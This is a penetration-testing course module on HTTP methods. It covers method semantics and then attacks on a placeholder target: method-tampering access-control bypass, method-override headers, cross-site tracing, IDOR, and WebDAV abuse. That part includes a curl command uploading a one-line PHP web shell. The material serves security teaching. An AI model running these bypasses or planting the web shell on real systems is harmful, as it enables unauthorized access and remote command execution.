# HTTP Methods

## Unit 1: Web Application Fundamentals — Topic 3

## 🎯 Overview

HTTP methods (also called verbs) define the action to be performed on a resource. Each method has different semantics and security implications. Understanding HTTP methods is essential for API testing, access control bypass, and discovering hidden application functionality.

---

## 1. Standard HTTP Methods

```
┌──────────────────────────────────────────────────────────────┐
│                    HTTP METHODS OVERVIEW                      │
├──────────┬──────────────────────────────────────────────────┤
│  GET     │  Retrieve a resource (no body)                    │
│  POST    │  Submit data / create a resource                  │
│  PUT     │  Replace an entire resource                       │
│  PATCH   │  Partially update a resource                      │
│  DELETE  │  Remove a resource                                │
│  HEAD    │  Like GET but returns headers only                │
│  OPTIONS │  List supported methods for a resource            │
│  TRACE   │  Echo back the request (diagnostic)               │
│  CONNECT │  Establish a tunnel (proxy)                       │
└──────────┴──────────────────────────────────────────────────┘
```

### Method Properties

| Method | Safe | Idempotent | Has Body | Cacheable |
|--------|------|------------|----------|-----------|
| GET | ✅ | ✅ | No | ✅ |
| POST | ❌ | ❌ | Yes | Conditional |
| PUT | ❌ | ✅ | Yes | ❌ |
| PATCH | ❌ | ❌ | Yes | ❌ |
| DELETE | ❌ | ✅ | Optional | ❌ |
| HEAD | ✅ | ✅ | No | ✅ |
| OPTIONS | ✅ | ✅ | Optional | ❌ |
| TRACE | ✅ | ✅ | No | ❌ |

> **Safe**: Does not modify server state  
> **Idempotent**: Multiple identical requests produce the same result

---

## 2. Methods in Detail

### GET — Retrieve Resources

```http
GET /api/users/123?fields=name,email HTTP/1.1
Host: target.com
Authorization: Bearer eyJ...

# Response: User data returned
# Security: Parameters visible in URL, logs, Referer header
# Testing: Injection via query parameters
```

### POST — Submit Data

```http
POST /api/users HTTP/1.1
Host: target.com
Content-Type: application/json
Content-Length: 42

{"username":"newuser","role":"admin"}

# Security: Body not logged by default (but can be)
# Testing: Parameter tampering, privilege escalation
```

### PUT vs PATCH

```
PUT /api/users/123              PATCH /api/users/123
{                               {
  "name": "John",                 "role": "admin"
  "email": "j@test.com",       }
  "role": "admin",
  "status": "active"           # Only updates specified field
}                               # Testing: Can you PATCH the
                                #   "role" field to "admin"?
# Replaces entire resource
# Testing: Add admin fields
```

### DELETE — Remove Resources

```http
DELETE /api/users/456 HTTP/1.1
Host: target.com
Authorization: Bearer eyJ...

# Testing: Can you delete other users' resources?
# IDOR: Change 456 to another user's ID
```

---

## 3. Security-Critical Methods

### OPTIONS — Method Enumeration

```bash
# Discover allowed methods
curl -X OPTIONS https://target.com/api/users -i

# Response reveals available methods
HTTP/1.1 200 OK
Allow: GET, POST, PUT, DELETE, OPTIONS
Access-Control-Allow-Methods: GET, POST, PUT, DELETE

# Security implications:
# - PUT/DELETE enabled when shouldn't be
# - WebDAV methods exposed
# - CORS misconfiguration
```

### TRACE — Cross-Site Tracing (XST)

```http
TRACE / HTTP/1.1
Host: target.com
Cookie: session=abc123
X-Custom: injected-data

# Server echoes back the request including cookies
# If enabled, attacker can steal HttpOnly cookies via XSS

HTTP/1.1 200 OK
Content-Type: message/http

TRACE / HTTP/1.1
Host: target.com
Cookie: session=abc123    ← HttpOnly cookie exposed!
X-Custom: injected-data
```

```bash
# Test for TRACE
curl -X TRACE https://target.com/ -i
nmap --script http-trace -p 80,443 target.com
```

---

## 4. Method-Based Attack Techniques

### HTTP Method Tampering

```
┌─────────────────────────────────────────────────────────────┐
│               METHOD TAMPERING ATTACKS                       │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  Scenario: Admin panel blocks GET/POST to /admin            │
│                                                             │
│  GET  /admin → 403 Forbidden                               │
│  POST /admin → 403 Forbidden                               │
│  PUT  /admin → 200 OK  ← Method not checked!               │
│  HEAD /admin → 200 OK  ← Method not checked!               │
│                                                             │
│  Some frameworks only check specific methods                │
└─────────────────────────────────────────────────────────────┘
```

```bash
# Test all methods against an endpoint
for method in GET POST PUT DELETE PATCH HEAD OPTIONS TRACE; do
  echo -n "$method: "
  curl -s -o /dev/null -w "%{http_code}" -X $method \
    https://target.com/admin/
  echo
done

# Output:
# GET: 403
# POST: 403
# PUT: 200    ← Bypass found!
# DELETE: 405
# PATCH: 200  ← Bypass found!
# HEAD: 200   ← Bypass found!
# OPTIONS: 200
# TRACE: 405
```

### HTTP Method Override

```bash
# X-HTTP-Method-Override header
# Some frameworks support method override for clients
# that only support GET/POST

curl -X POST https://target.com/api/users/1 \
  -H "X-HTTP-Method-Override: DELETE"
# Server processes as DELETE despite POST request

# Other override headers to try:
# X-HTTP-Method: DELETE
# X-Method-Override: PUT
# _method=DELETE (in body or query string)
```

### WebDAV Methods

```bash
# WebDAV extends HTTP with additional methods
# Often enabled unintentionally

# PROPFIND — enumerate files/directories
curl -X PROPFIND https://target.com/ -H "Depth: 1"

# MKCOL — create directory
curl -X MKCOL https://target.com/test/

# COPY/MOVE — copy or move resources
curl -X COPY https://target.com/file.txt \
  -H "Destination: https://target.com/copied.txt"

# PUT — upload file (if WebDAV PUT is enabled)
curl -X PUT https://target.com/shell.php \
  -d '<?php system($_GET["cmd"]); ?>'

# Test WebDAV
nmap --script http-webdav-scan -p 80,443 target.com
```

---

## 5. RESTful API Method Mapping

```
┌──────────┬───────────────────┬──────────────────────────┐
│  Method  │  CRUD Operation   │  Example Endpoint        │
├──────────┼───────────────────┼──────────────────────────┤
│  GET     │  Read             │  GET /api/users          │
│  POST    │  Create           │  POST /api/users         │
│  PUT     │  Update (full)    │  PUT /api/users/123      │
│  PATCH   │  Update (partial) │  PATCH /api/users/123    │
│  DELETE  │  Delete           │  DELETE /api/users/123   │
└──────────┴───────────────────┴──────────────────────────┘

# Testing approach:
# 1. Enumerate all endpoints with each method
# 2. Test for IDOR (change resource IDs)
# 3. Test for privilege escalation (modify role fields)
# 4. Test for method restrictions (can regular user DELETE?)
```

---

## 📊 Summary Table

| Method | Primary Use | Attack Surface |
|--------|-------------|---------------|
| GET | Retrieve data | URL parameter injection, caching issues |
| POST | Submit data | Body injection, CSRF |
| PUT | Replace resource | Unauthorized modification, file upload |
| PATCH | Partial update | Privilege escalation via field modification |
| DELETE | Remove resource | Unauthorized deletion, IDOR |
| HEAD | Header retrieval | Bypass body-based security checks |
| OPTIONS | Method discovery | Information disclosure, CORS bypass |
| TRACE | Request echo | HttpOnly cookie theft (XST) |

---

## ❓ Revision Questions

1. What is the difference between PUT and PATCH from a security perspective?
2. How can HTTP method tampering bypass access controls?
3. What is Cross-Site Tracing (XST) and why is the TRACE method dangerous?
4. How do X-HTTP-Method-Override headers enable attack vectors?
5. What WebDAV methods should a penetration tester look for?
6. Why might HEAD requests return different access control results than GET?

---

*Previous: [02-request-response-structure.md](02-request-response-structure.md) | Next: [04-status-codes.md](04-status-codes.md)*

---

*[Back to README](../README.md)*
